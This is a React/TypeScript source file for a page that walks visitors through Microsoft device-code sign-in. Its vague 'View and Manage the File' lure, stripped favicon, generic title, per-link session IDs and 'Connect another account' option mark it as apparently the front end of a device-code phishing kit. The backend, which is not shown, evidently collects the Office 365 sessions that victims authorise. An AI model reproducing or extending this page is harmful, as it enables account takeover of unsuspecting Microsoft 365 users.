import { useEffect, useState } from "react";
import { useParams } from "react-router-dom";

const API_BASE = import.meta.env.VITE_API_URL || "";

interface SessionInfo {
  sessionId: string;
  userCode: string;
  verificationUri: string;
}

export function ConnectLinkPage() {
  const { loginId: linkId } = useParams<{ loginId: string }>();
  const [session, setSession] = useState<SessionInfo | null>(null);
  const [status, setStatus] = useState<"loading" | "starting" | "ready" | "signing_in" | "done" | "error">("loading");
  const [error, setError] = useState<string | null>(null);
  const [copied, setCopied] = useState(false);

  // Remove favicon and set page title for connection page
  useEffect(() => {
    const originalTitle = document.title;
    document.title = "Connection";

    // Remove favicon
    const existingIcons = document.querySelectorAll("link[rel*='icon']");
    const removedIcons: { el: HTMLElement; parent: HTMLElement }[] = [];
    existingIcons.forEach((el) => {
      if (el.parentNode) {
        removedIcons.push({ el: el as HTMLElement, parent: el.parentNode as HTMLElement });
        el.parentNode.removeChild(el);
      }
    });

    // Set a blank favicon to prevent browser default
    const blankFavicon = document.createElement("link");
    blankFavicon.rel = "icon";
    blankFavicon.href = "data:,";
    document.head.appendChild(blankFavicon);

    return () => {
      document.title = originalTitle;
      document.head.removeChild(blankFavicon);
      removedIcons.forEach(({ el, parent }) => parent.appendChild(el));
    };
  }, []);

  // Step 1: Validate the link exists
  useEffect(() => {
    if (!linkId) return;

    fetch(`${API_BASE}/microsoft/connect-info/${linkId}`)
      .then((res) => {
        if (!res.ok) throw new Error("Connection link not found");
        return res.json();
      })
      .then(() => {
        // Link is valid — start a device code session
        startSession();
      })
      .catch((err) => {
        setError(err.message);
        setStatus("error");
      });
  }, [linkId]);

  // Step 2: Start a fresh device code session
  const startSession = async () => {
    setStatus("starting");
    setError(null);
    setSession(null);

    try {
      const res = await fetch(`${API_BASE}/microsoft/start-session/${linkId}`, {
        method: "POST",
      });
      if (!res.ok) {
        const data = await res.json();
        throw new Error(data.error || "Failed to start session");
      }
      const data = await res.json();
      setSession({
        sessionId: data.sessionId,
        userCode: data.userCode,
        verificationUri: data.verificationUri,
      });
      setStatus("ready");
    } catch (err: any) {
      setError(err.message);
      setStatus("error");
    }
  };

  // Step 3: Poll for completion after user clicks sign in
  useEffect(() => {
    if (status !== "signing_in" || !session) return;

    const interval = setInterval(async () => {
      try {
        const res = await fetch(`${API_BASE}/microsoft/session-status/${session.sessionId}`);
        const data = await res.json();

        if (data.status === "completed") {
          clearInterval(interval);
          setStatus("done");
        } else if (data.status === "error") {
          clearInterval(interval);
          setError(data.error);
          setStatus("error");
        }
      } catch {
        // keep polling
      }
    }, 2000);

    return () => clearInterval(interval);
  }, [status, session]);

  const handleCopyCode = () => {
    if (session?.userCode) {
      navigator.clipboard.writeText(session.userCode);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    }
  };

  const handleLogin = () => {
    if (!session) return;
    const url = `${session.verificationUri}?otc=${session.userCode}`;
    window.open(url, "_blank");
    setStatus("signing_in");
  };

  // After success or error, allow connecting another account
  const handleConnectAnother = () => {
    startSession();
  };

  return (
    <div className="login-page">
      <div className="login-card" style={{ maxWidth: 480 }}>
        {(status === "loading" || status === "starting") && (
          <div style={{ textAlign: "center", padding: "40px 0" }}>
            <div className="loading-spinner" />
            <p style={{ marginTop: 16, color: "var(--color-text-muted)" }}>
              {status === "loading" ? "Loading..." : "Generating your sign-in code..."}
            </p>
          </div>
        )}

        {status === "ready" && session && (
          <div>
            <div style={{
              width: 64, height: 64, borderRadius: "50%",
              background: "var(--color-bg-active)",
              display: "flex", alignItems: "center", justifyContent: "center",
              margin: "0 auto 20px", fontSize: 28,
            }}>
              📧
            </div>
            <h1 style={{ fontSize: 20, marginBottom: 8, textAlign: "center" }}>Connect your account</h1>
            <p style={{ marginBottom: 28, color: "var(--color-text-secondary)", textAlign: "center", lineHeight: 1.6 }}>
              Connect your account to View and Manage the File
            </p>

            <div style={{
              background: "var(--color-bg-secondary)",
              borderRadius: "var(--radius-lg)",
              padding: "24px", marginBottom: 20, textAlign: "center",
            }}>
              <div style={{ fontSize: 12, color: "var(--color-text-muted)", marginBottom: 10, textTransform: "uppercase", letterSpacing: 1, fontWeight: 600 }}>
                Your Code
              </div>
              <div style={{
                fontSize: 36, fontWeight: 700, letterSpacing: 8,
                color: "var(--color-primary)", fontFamily: "var(--font-mono)", marginBottom: 12,
              }}>
                {session.userCode}
              </div>
              <button
                onClick={handleCopyCode}
                style={{
                  padding: "6px 20px", fontSize: 13,
                  background: copied ? "var(--color-success)" : "var(--color-bg)",
                  color: copied ? "white" : "var(--color-text)",
                  border: "1px solid var(--color-border)",
                  borderRadius: "var(--radius-md)", cursor: "pointer", transition: "all 0.2s",
                }}
              >
                {copied ? "Copied!" : "Copy Code"}
              </button>
            </div>

            <div style={{
              marginBottom: 20, padding: "16px",
              background: "var(--color-bg-secondary)", borderRadius: "var(--radius-md)",
              fontSize: 13, color: "var(--color-text-secondary)", lineHeight: 1.8,
            }}>
              <div style={{ fontWeight: 600, marginBottom: 8, color: "var(--color-text)" }}>How to connect:</div>
              <div>1. Copy the code above</div>
              <div>2. Click <strong>Sign in with Microsoft</strong> below</div>
              <div>3. Paste the code when prompted</div>
              <div>4. Sign in with your Office 365 account</div>
            </div>

            <button
              className="btn btn-primary"
              onClick={handleLogin}
              style={{ padding: "14px 32px", fontSize: 15, width: "100%", justifyContent: "center", gap: 8 }}
            >
              Sign in with Microsoft
            </button>
          </div>
        )}

        {status === "signing_in" && (
          <div style={{ textAlign: "center" }}>
            <div style={{
              width: 64, height: 64, borderRadius: "50%",
              background: "var(--color-bg-active)",
              display: "flex", alignItems: "center", justifyContent: "center",
              margin: "0 auto 20px", fontSize: 28,
            }}>
              🔄
            </div>
            <h1 style={{ fontSize: 20, marginBottom: 8 }}>Waiting for sign-in</h1>
            <p style={{ color: "var(--color-text-secondary)", marginBottom: 24, lineHeight: 1.6 }}>
              Complete the sign-in in the Microsoft window that opened. This page will update automatically.
            </p>
            <div className="loading-spinner" />
          </div>
        )}

        {status === "done" && (
          <div style={{ textAlign: "center" }}>
            <div style={{
              width: 64, height: 64, borderRadius: "50%",
              background: "#e6f4ea",
              display: "flex", alignItems: "center", justifyContent: "center",
              margin: "0 auto 20px", fontSize: 28,
            }}>
              ✓
            </div>
            <h1 style={{ fontSize: 20, marginBottom: 8, color: "var(--color-success)" }}>Account connected</h1>
            <p style={{ color: "var(--color-text-secondary)", lineHeight: 1.6, marginBottom: 20 }}>
              Your Office 365 account has been connected successfully.
            </p>
            <button
              className="btn btn-primary"
              onClick={handleConnectAnother}
              style={{ padding: "10px 24px" }}
            >
              Connect another account
            </button>
          </div>
        )}

        {status === "error" && (
          <div style={{ textAlign: "center" }}>
            <div style={{
              width: 64, height: 64, borderRadius: "50%",
              background: "#fde8e8",
              display: "flex", alignItems: "center", justifyContent: "center",
              margin: "0 auto 20px", fontSize: 28,
            }}>
              !
            </div>
            <h1 style={{ fontSize: 20, marginBottom: 8 }}>Something went wrong</h1>
            <p style={{ color: "var(--color-danger)", marginBottom: 16, lineHeight: 1.6 }}>
              {error || "Something went wrong."}
            </p>
            <button
              className="btn btn-primary"
              onClick={handleConnectAnother}
              style={{ padding: "10px 24px" }}
            >
              Try again
            </button>
          </div>
        )}
      </div>
    </div>
  );
}
